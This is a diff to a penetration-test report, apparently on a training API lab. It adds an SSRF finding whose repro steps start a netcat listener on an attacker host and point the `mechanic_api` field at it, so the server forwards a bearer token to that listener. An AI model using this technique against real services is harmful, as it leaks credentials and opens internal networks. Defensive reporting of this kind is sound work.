@@ -13,7 +13,7 @@ _Written last. Max 5 sentences: posture, counts by severity, dominant themes._
 | Severity | Count |
 |----------|-------|
 | Critical | 1 |
-| High     | 1 |
+| High     | 2 |
 | Medium   | 4 |
 | Low      | 0 |
 | Info     | 0 |
@@ -94,6 +94,7 @@ technical severity of the defect, not the exposure of this box.
 | F-004 | Unauthorized report download via predictable `filename` | API1 BOLA | 6.5 | Medium | Confirmed |
 | F-005 | Negative order quantity increases account credit | API6 Business Flows | 6.5 | Medium | Confirmed (mechanism pending) |
 | F-006 | NoSQL operator injection in coupon validation | CWE-943 (API8:2019) | 8.1 | High | Confirmed |
+| F-007 | SSRF via `mechanic_api` + bearer-token leak | API7 SSRF | 8.5 | High | Confirmed |
 
 ---
 
@@ -199,6 +200,23 @@ _Fixed template per finding. Nothing added until confirmed with evidence in
 | **Remediation** | Validate `coupon_code` is a string; reject non-string types; configure the driver/ODM to block operator injection from user input. |
 
 > Scope of evidence: the `$ne` response proves confidentiality impact (coupon disclosure / collection enumeration = C:H). The integrity half (I:H — redeeming the recovered coupon for credit) is inferred; attach a redemption request/response to evidence it.
+
+### F-007
+
+| Field | |
+|-------|--|
+| **Title** | Server-Side Request Forgery via `mechanic_api`, with bearer-token leakage |
+| **API Top 10** | API7:2023 Server Side Request Forgery |
+| **Severity** | 8.5 High — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` |
+| **Affected** | POST `/workshop/api/merchant/contact_mechanic` (`mechanic_api` field) |
+| **Description** | The endpoint issues a server-side HTTP request to the URL supplied in `mechanic_api` with no validation or allowlist. The outbound request also carries the caller's `Authorization` bearer token. |
+| **Steps to repro** | 1. Start a listener on an attacker host (`nc -lvnp 9000`). 2. As attacker (`ram`), POST to `contact_mechanic` with `"mechanic_api":"http://172.17.0.1:9000/ssrf-test"`. 3. The listener receives a request from the internal app container. |
+| **Evidence** | Listener received: `GET /ssrf-test?... HTTP/1.1`, `Host: 172.17.0.1:9000`, `User-Agent: python-requests/2.30.0`, source `172.19.0.10` (app container), and `Authorization: Bearer <token>`. See `evidence.md` → F-007. |
+| **Impact** | An authenticated user makes the server send requests to arbitrary hosts (internal services reachable) and leaks a valid bearer token to an attacker-controlled endpoint. |
+| **Root cause** | User-supplied URL is fetched server-side without an allowlist; the `Authorization` header is forwarded to the third-party URL. |
+| **Remediation** | Restrict `mechanic_api` to an allowlist of known hosts; block internal/link-local/loopback ranges after DNS resolution; never forward the caller's `Authorization` to an outbound third-party request. |
+
+> Scope of evidence: full (non-blind) SSRF to an attacker-controlled listener is proven, plus token leakage. Reaching internal-only services was not demonstrated (would raise integrity impact).
 
 <!--
 ### F-00X
